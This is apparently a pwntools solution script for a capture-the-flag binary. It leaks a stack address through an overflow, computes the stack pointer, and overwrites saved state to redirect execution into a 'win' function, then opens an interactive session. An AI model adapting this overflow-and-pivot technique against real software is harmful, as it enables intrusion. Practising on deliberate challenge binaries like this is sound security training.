#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
recvut = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *main + 40
'''

p = process("./chall")
#p = gdb.debug("./chall", gdbscript = script)

payload = b"A" * 0x118
s(payload)

payload = b"B" * 0x100
s(payload)
recvut(b"B" * 0x100)
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
rsp = stack_leak - 0x468
lleak("rsp: ", rsp)

win = exe.symbols['win']
payload = b"C" * 8 + p64(win + 5)
payload = payload.ljust(0x110, b"C") 
payload += p64(rsp)
s(payload)

sl(b"D")

p.interactive()